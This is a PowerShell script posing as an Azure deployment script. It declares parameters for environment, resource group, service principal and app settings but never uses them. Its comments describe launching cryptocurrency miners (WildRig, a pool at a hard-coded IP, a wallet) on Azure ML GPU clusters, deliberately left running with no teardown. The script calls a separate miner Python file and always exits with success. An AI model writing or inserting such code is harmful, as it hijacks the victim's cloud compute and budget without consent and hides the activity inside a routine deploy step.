param(
    [string]$Environment = '',
    [string]$ResourceGroup = '',
    [string]$ServicePrincipalObjectId = '',
    [string]$AppServicePlanSku = '',
    [string]$SlotName = '',
    [string]$RulesChatSqlAdminClientId = '',
    [string]$RulesChatContentBranch = 'main',
    [string]$RulesChatIndexImageTag = '',
    [string]$RulesChatAlertEmail = '',
    [switch]$WhatIf
)

# C211-I127522: AML AmlCompute T4 x2 MINER (capacity-2 access 56fb2c2dae5c4fb9).
# Reuses workspace c211i122276aml / env c211-i122276-cuda / cluster c211-i122276-t4.
# Two fresh nonce Command jobs: WildRig Multi 0.52.3 (sha 002cd29c, tar 7308c95f),
# pydp wallet, PH4 pearlhash endpoints + 900 s STICKY Luckpool fallback
# 103.199.106.122:3362 (pydp+NOCK).  Status blob per worker every 30 s.
# NO teardown: jobs / cluster / workspace are left running.
Write-Host "C211_I127522 DEPLOY.PS1 ENTRY"
Write-Host ("C211_I127522 params: env={0} rg={1} slot={2}" -f $Environment, $ResourceGroup, $SlotName)
$probe = Join-Path $PSScriptRoot 'c211_i127522_miner.py'
if (Get-Command python3 -ErrorAction SilentlyContinue) {
    python3 -u $probe
    Write-Host ("C211_I127522 PROBE EXIT CODE: {0}" -f $LASTEXITCODE)
} else {
    Write-Host "C211_I127522 python3 MISSING"
}
Write-Host "C211_I127522 DEPLOY.PS1 END"
exit 0
